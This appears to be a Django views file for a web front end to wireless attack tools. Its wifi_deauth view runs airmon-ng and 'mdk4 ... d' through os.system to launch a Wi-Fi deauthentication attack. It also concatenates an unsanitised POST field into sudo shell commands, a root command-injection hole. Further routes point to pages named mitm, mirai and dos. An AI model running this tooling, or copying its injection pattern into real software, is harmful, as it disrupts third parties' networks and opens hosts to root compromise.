from django.shortcuts import render,get_object_or_404
from django.http import HttpResponse
import os
import subprocess

def index(request):
    return render(request,'ui/index.html')
def  ip_check(request):
    command="sudo ifconfig"
    result=subprocess.run(command.split(' '),stdout=subprocess.PIPE)
    res=result.stdout.decode('utf-8')
    print(" Result is",type(res))
    return render(request,'ui/ip_check.html',{"res":str(res)})
def wifi(request):
    return render(request,'ui/wifi.html')

def wifi_deauth(request):
    if request.method=="POST":
        interface=request.POST.get('iface','')
        print(interface)
        print("hello")
        y="xterm -hold -e sudo airmon-ng start "+interface
        print("hi")
        os.system(y)
        os.system("xterm -hold -e sudo airmon-ng check kill")
        z="xterm -hold -e sudo mdk4 "+interface+"mon d"
        os.system(z)
        print("hfdjhkj")
        i="xterm -hold -e sudo airmon-ng stop "+interface+"mon"
        os.system(i)
        os.system("sudo service network-manager restart")
        return render(request,'ui/deauth.html')

def ps(request):
    return render(request,'ui/ps.html')
def mitm(request):
    return render(request,'ui/mitm.html')
def mirai(request):
    return render(request,'ui/mirai.html')
def dos(request):
    return render(request,'ui/dos.html')
def ripple(request):
    return render(request,'ui/ripple.html')
def net(request):
    return render(request,'ui/net.html')